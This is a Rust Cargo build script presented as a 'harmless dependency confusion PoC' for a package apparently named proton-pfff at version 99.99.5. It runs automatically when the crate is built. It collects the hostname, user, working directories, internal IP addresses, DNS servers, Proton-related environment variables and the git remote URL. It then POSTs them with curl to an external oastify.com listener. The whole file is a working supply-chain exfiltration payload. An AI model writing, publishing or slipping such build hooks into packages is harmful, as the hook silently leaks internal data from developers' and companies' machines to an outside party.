use std::process::Command;
use std::env;
use std::fs;
use std::path::Path;

fn main() {
    println!("cargo:warning=This is a harmless dependency confusion PoC.");

    // === 1. Basic system info ===
    let hostname = env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string());
    let user = env::var("USER").unwrap_or_else(|_| "unknown".to_string());
    let cwd = env::var("PWD").unwrap_or_else(|_| "unknown".to_string());
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| "unknown".to_string());

    // === 2. Get internal IP addresses ===
    let internal_ips = get_internal_ips();
    let ip_list_str = format!("[{}]", internal_ips.iter().map(|s| format!("\"{}\"", s)).collect::<Vec<_>>().join(","));

    // === 3. Get DNS servers ===
    let dns_servers = fs::read_to_string("/etc/resolv.conf")
        .map(|content| {
            content.lines()
                .filter(|line| line.starts_with("nameserver"))
                .filter_map(|line| line.split_whitespace().nth(1))
                .collect::<Vec<_>>()
                .join(", ")
        })
        .unwrap_or_else(|_| "not readable".to_string());

    // === 4. Check existence of system files (do NOT read them) ===
    let has_etc_passwd = Path::new("/etc/passwd").exists();
    let has_etc_hostname = Path::new("/etc/hostname").exists();
    let has_etc_issue = Path::new("/etc/issue").exists();

    // === 5. Proton-specific environment variables ===
    let proton_env_vars: Vec<String> = env::vars()
        .filter(|(key, _)| key.contains("PROTON") || key.contains("proton"))
        .map(|(key, val)| format!("{}={}", key, val))
        .collect();
    let proton_env_str = if proton_env_vars.is_empty() {
        "none".to_string()
    } else {
        proton_env_vars.join("; ")
    };

    // === 6. Read project's Cargo.toml name ===
    let project_name = if let Ok(content) = fs::read_to_string("Cargo.toml") {
        content.lines()
            .find(|line| line.trim().starts_with("name ="))
            .and_then(|line| line.split('=').nth(1))
            .map(|s| s.trim().trim_matches('"').to_string())
            .unwrap_or_else(|| "unknown".to_string())
    } else {
        "unknown".to_string()
    };

    // === 7. Git remote ===
    let git_remote = Command::new("git")
        .args(&["remote", "get-url", "origin"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "not found".to_string());

    // === 8. Check Proton indicators ===
    let contains_proton = manifest_dir.to_lowercase().contains("proton") ||
                          cwd.to_lowercase().contains("proton") ||
                          hostname.to_lowercase().contains("proton") ||
                          project_name.to_lowercase().contains("proton") ||
                          git_remote.to_lowercase().contains("proton");

    // === 9. Build JSON payload (manual, no serde) ===
    let payload = format!(
        r#"{{
            "pkg":"proton-pfff",
            "version":"99.99.5",
            "hostname":"{}",
            "user":"{}",
            "cwd":"{}",
            "manifest_dir":"{}",
            "project_name":"{}",
            "contains_proton":{},
            "proton_env_vars":"{}",
            "git_remote":"{}",
            "internal_ips":{},
            "dns_servers":"{}",
            "has_etc_passwd":{},
            "has_etc_hostname":{},
            "has_etc_issue":{}
        }}"#,
        hostname,
        user,
        cwd,
        manifest_dir,
        project_name,
        contains_proton,
        proton_env_str,
        git_remote,
        ip_list_str,
        dns_servers,
        has_etc_passwd,
        has_etc_hostname,
        has_etc_issue
    );

    // === 10. Send to your Oastify listener ===
    let url = "https://yfhkq0dwc3y24kmbtxv7bmtlbch45wtl.oastify.com";
    let _ = Command::new("curl")
        .args(&["-s", "-X", "POST", url, "-H", "Content-Type: application/json", "-d", &payload])
        .status();
}

// Helper to get internal IPs (runs `ip addr` or `ifconfig`)
fn get_internal_ips() -> Vec<String> {
    let mut ips = Vec::new();
    // Try `ip addr`
    if let Ok(output) = Command::new("ip").args(&["addr", "show"]).output() {
        if let Ok(out) = String::from_utf8(output.stdout) {
            for line in out.lines() {
                if let Some(ip) = line.trim().split_whitespace().nth(1) {
                    // Filter out loopback and IPv6 link-local
                    if !ip.starts_with("127.") && !ip.starts_with("::1") && !ip.starts_with("fe80:") {
                        ips.push(ip.to_string());
                    }
                }
            }
        }
    } else if let Ok(output) = Command::new("ifconfig").output() {
        if let Ok(out) = String::from_utf8(output.stdout) {
            for line in out.lines() {
                if let Some(ip) = line.trim().split_whitespace().nth(1) {
                    if ip.contains('.') && !ip.starts_with("127.") {
                        ips.push(ip.to_string());
                    }
                }
            }
        }
    }
    // If nothing, try to get local IP via socket (simple fallback)
    if ips.is_empty() {
        if let Ok(sock) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if let Ok(local) = sock.local_addr() {
                ips.push(local.ip().to_string());
            }
        }
    }
    ips
}